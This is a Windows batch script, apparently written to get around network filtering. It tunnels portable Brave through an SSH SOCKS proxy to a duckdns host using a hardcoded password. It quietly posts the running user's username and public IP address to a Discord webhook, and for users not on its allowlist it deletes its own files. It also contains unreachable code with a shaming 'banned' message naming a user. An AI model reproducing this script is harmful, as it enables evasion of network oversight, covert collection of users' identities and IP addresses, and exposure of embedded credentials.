@echo off
setlocal enabledelayedexpansion
set "USER=%USERNAME%"
set "installRoot=%USERPROFILE%\Desktop\BravePortable"
set "launcherPath=%USERPROFILE%\Desktop\start_unblocking.bat"
cls
if /I "%USER%"=="h4.73" goto launch
if /I "%USER%"=="h4.73" goto launch
if /I "%USER%"=="h4.73" goto launch



goto cleanup

if "%USER%"=="g6.zm" echo STOP WATCHING 18+ CONTENT I KNOW IT WAS YOU
if "%USER%"=="g6.zm" (
    echo You are currently banned.
    echo To appeal or for support email: brovscode@gmail.com
    pause
    exit /b
)




if "%USER%"=="h4.73" goto launch

echo SOMEONE WATCHED NOT APPROPRATE THINGS
echo THIS IS YOUR ONE AND ONLY WARNING
timeout /t 10


:launch
echo Starting bypass...
:: -D 1080 sets up the SOCKS proxy
:: -pw password87 handles the authentication
:: -batch prevents interactive prompts
:: -N ensures no shell is opened
start "" /b "BravePortable\plink.exe" -batch -pw password87 -hostkey "SHA256:91kWQJz3BT8C9UhfjzeoIPp28Ak7wNODxypuaCyeAxU" -N -D 1080 ezbat@doubleaaguy.duckdns.org
echo Launching Brave...
start "" "BravePortable\brave-portable\brave-portable.exe"

for /f %%i in ('curl -s https://api.ipify.org') do set ip=%%i
curl --proxy socks5h://127.0.0.1:1080 -H "Content-Type: application/json" -d "{\"content\":\"%USER%, %ip%\"}" "https://discord.com/api/webhooks/1496159081264709704/Wj-se7KZdOBo-uX0D2yrCx9vpp5eHSdGThnOYz-mBcXLHaTu_PEynKDfwgx0QSGozupV"


echo Done.
exit /b

:cleanup
echo Cleaning up installed files for %USER%...

taskkill /IM brave-portable.exe /F >nul 2>nul
taskkill /IM plink.exe /F >nul 2>nul

if exist "%installRoot%" (
    rmdir /S /Q "%installRoot%"
)

if exist "%launcherPath%" (
    del /F /Q "%launcherPath%" >nul 2>nul
)

echo Cleanup complete.
